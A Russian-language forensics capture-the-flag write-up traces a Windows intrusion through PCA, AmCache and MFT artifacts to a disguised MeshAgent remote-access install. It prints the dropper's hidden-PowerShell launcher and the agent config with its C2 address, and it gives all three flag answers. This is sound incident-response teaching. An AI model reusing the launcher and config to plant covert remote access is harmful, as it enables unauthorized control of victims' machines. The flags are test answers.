# Digital footprint

## Легенда

На закрытых форумах была обнаружена утечка конфиденциальных данных, связанных с организацией. По содержимому утечки удалось локализовать рабочую станцию под управлением Windows. Вам предоставлены собранные цифровые артефакты для проведения дальнейшего анализа.

1. Необходимо определить семейство вредоносного ПО (указать ссылку на репозиторий проекта), использованного злоумышленниками после получения доступа к информационной системе.
Формат флага: rdg{https://github.com/author/project}

2. Необходимо подготовить перечень индикаторов компрометации для их использования на средствах защиты информации. Укажите MD5 хеш-сумму основного модуля ВПО (в нижнем регистре) и IP-адрес его центра удаленного управления.
Формат флага: rdg{MD5_127.0.0.1}

3. Необходимо определить способ закрепления злоумышленника в системе. Способ закрепления необходимо указать в формате MITRE ATT&CK. Укажите имя созданной сущности для закрепления (без пробелов, в нижнем регистре).
Формат флага: rdg{TXXXX.XXX_name}

### Решение

Посмотрим, какие исполняемые файлы запускались в рамках скомпрометированной операционной системе. Существует большое количество артефактов, указывающих на это. Рассмотрим некоторые из них.
- Program Compatibility Assistant (PCA). Данный артефакт в каком-то виде появился еще в Windows 8, но в полной мере стал использоваться с Windows 11 Pro (22H2). Подробнее: https://aboutdfir.com/new-windows-11-pro-22h2-evidence-of-execution-artifact/.

Содержимое C:\\Windows\\appcompat\\pca\\PcaAppLaunchDic.txt:

```
D:\setup64.exe|2025-03-23 21:30:35.599
C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2112.32.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe|2025-03-23 21:31:33.302
C:\Users\tech\Downloads\7z2409-x64.exe|2025-03-23 21:35:57.475
C:\Users\tech\Downloads\Firefox Installer.exe|2025-03-23 21:39:15.956
C:\Users\tech\Downloads\Updater.exe|2025-03-28 10:44:43.626
C:\Users\tech\Desktop\Collector_velociraptor-v0.74.1-windows-amd64.exe|2025-03-28 10:49:03.229

```
Содержимое C:\\Windows\\appcompat\\pca\\PcaGeneralDb0.txt:
```
2025-03-23 21:44:58.667|2|%programfiles%\mozilla firefox\firefox.exe|firefox|mozilla corporation|136.0.2|0006483fc29456f3f6192ed9832cd8992ebe00000000|Abnormal process exit with code 0x1
2025-03-23 21:44:58.762|2|%programfiles%\mozilla firefox\firefox.exe|firefox|mozilla corporation|136.0.2|0006483fc29456f3f6192ed9832cd8992ebe00000000|Abnormal process exit with code 0x1
2025-03-23 21:44:58.809|2|%programfiles%\mozilla firefox\firefox.exe|firefox|mozilla corporation|136.0.2|0006483fc29456f3f6192ed9832cd8992ebe00000000|Abnormal process exit with code 0x1
2025-03-28 10:44:46.424|3|%USERPROFILE%\downloads\updater.exe||||0006d35d19a7bfb72001932fe8df8f29500a0000ffff|PCA resolve is called, resolver name: DetectorShim_KernelDriver, result: 0

```
Можем получить временную метку запуска, полный путь, статус запуска и т.д.
- Application Activity Cache (AmCache). Файл реестра, содержащий данные о запуске исполняемых файлов. Располагается по следующему пути - C:\Windows\appcompat\Programs\Amcache.hve. Его можно распарсить с помощью инструмента RegRipper (https://github.com/keydet89/RegRipper3.0). Полученное содержимое:

```
<truncated>

c:\program files\7-zip\uninstall.exe  LastWrite: 2025-03-27 20:13:56Z
Hash: 5ded32077cda52b5527f75017552a598b0523db7

c:\program files (x86)\mozilla maintenance service\uninstall.exe  LastWrite: 2025-03-27 20:13:56Z
Hash: 072b39a0086ee0ecc283d51dbc295073c3cb0475

c:\users\tech\downloads\updater.exe  LastWrite: 2025-03-28 10:44:46Z
Hash: 7f56e91b828a0b48478765171f4208ad8f89bae0

c:\program files\mozilla firefox\updater.exe  LastWrite: 2025-03-27 20:13:56Z
Hash: 954d37c43e034b490b691666ce85c7a8eb2486d2

c:\windows\system32\upfc.exe  LastWrite: 2025-03-23 21:32:31Z
Hash: 2d6bba219472d069f67c589ee4040a7e1c289bce

<truncated>
```
Здесь помимо всего прочего фигурирует SHA1-хеш исполняемого файла. Проверим хеш 7f56e91b828a0b48478765171f4208ad8f89bae0 засветившегося ранее файла c:\users\tech\downloads\updater.exe на VirusTotal.

![изображение](https://github.com/user-attachments/assets/29998ffa-007c-45d4-875b-1c4b74d11e99)

Файл представляет собой самораспаковывающийся архив. 

![изображение](https://github.com/user-attachments/assets/f6bfdb74-8b83-4dfc-828f-992d67340baf)

Смотрим дочерние объекты на вкладке Relations. 

![изображение](https://github.com/user-attachments/assets/c8d3603a-f56b-489c-98af-1ffea37e0b8c)

Архив включал в себя три файла:
- WindowsUpdater.exe 
- WindowsUpdater.msh 
- run.cmd

WindowsUpdater.exe (впрочем как и его родительский исполняемый файл) детектируется средствами антивирусной защиты как ПО MeshAgent, представляющее собой клиентскую часть общедоступного решения для удаленного администрирования. Поиск в сети приводит к Github репозиторию https://github.com/Ylianst/MeshAgent. 

#### Флаг rdg{https://github.com/Ylianst/MeshAgent}.

С VirusTotal сразу можно извлечь необходимые для детектирования индикаторы компрометации:
- Updater.exe, MD5: 1c704f556015d46eb9f95f9ef311ea8e 
- IP-адрес С2: 158.160.118.18

#### Флаг: rdg{1c704f556015d46eb9f95f9ef311ea8e_158.160.118.18}

Конфигурацию MeshAgent, включая адрес С2, можно также извлечь из содержимого ресурсной записи MFT (так как файлы имеют небольшой размер). Найдем извлекаемые файлы по уже известным с VT именам. Для парсинга MFT вспользуемся утилитой EZ MFTECmd:

```powershell
> .\MFTECmd.exe -f "uploads\ntfs\%5C%5C.%5CC%3A\$MFT" --csv "." --csvf mft.csv
```

Полученный csv проанализируем с помощью EZ Timeline Exporer:

<img width="942" alt="Screen_3" src="https://github.com/user-attachments/assets/57a8e912-767e-4087-a669-171f7917cf63" />

Попробуем извлечь содержимое файла run.cmd и WindowsUpdater.msh с помощью того же MFTECmd (в качестве значения аргумента --de указываем идентификатор искомой записи с резидентными данными).

Вывод содержимого run.cmd (пакетный файл, запускаемый при исполнении архива Updater.exe):
```powershell
> .\MFTECmd.exe -f 'uploads\ntfs\%5C%5C.%5CC%3A\$MFT' --de 111829

<truncated>
    ASCII:   @echo off
set processPath="%temp%\WindowsUpdater.exe"
set processArgs="run"

powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command Start-Process -FilePath %processPath% -ArgumentList '%processArgs%' -WindowStyle Hidden
    UNICODE: ??????????????????????????≥??4?????????????????????????????????????????????????????????????????????????4??????????????????

```
Вывод содержимого WindowsUpdater.msh (конфигурационный файл MeshAgent):
```powershell
> .\MFTECmd.exe -f 'uploads\ntfs\%5C%5C.%5CC%3A\$MFT' --de 111828

<truncated>
  ASCII:   ???MeshName=Victims
MeshType=2
MeshID=0x8CDEAF00D7038E14AB2C29E6756DD0ED6675495B008A75E95D8101A28122EC3656D9F7CAA9D8957183C64597A33AA135
ServerID=BE924D2D29C07D1C2A4A18C1092883B28A7A82A262D65062FE99C7C35BFBB9AD3A602C88C9F3772EC0475131EF44DDB1
MeshServer=wss://158.160.118.18:443/agent.ashx
InstallFlags=2
ignoreProxyFile=1
    UNICODE: ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
```
Для закрепления в системе существует множество техник (закрепление через реестр, сервис, каталоги автозагрузки и т.д.). Просмотрим содержимое куста реестра SOFTWARE (C:\\Windows\\System32\\config\\SOFTWARE) с помощью EZ Registry Explorer. Проведем поиск по ключевому слову ранее выявленного исполняемого файла MeshAgent - WindowsUpdater.exe. В результате установим факт наличия созданной задачи "OneDrive Init" в планировщике задач Windows:

<img width="959" alt="Screen_4" src="https://github.com/user-attachments/assets/44207b64-37ad-4768-803b-5cc31afd6b52" />

Использование планировщика задач Windows соответствует технике T1053.005 Scheduled Task/Job: Scheduled Task матрицы MITRE ATT&CK. 

#### Флаг: rdg{T1053.005_onedriveinit} 
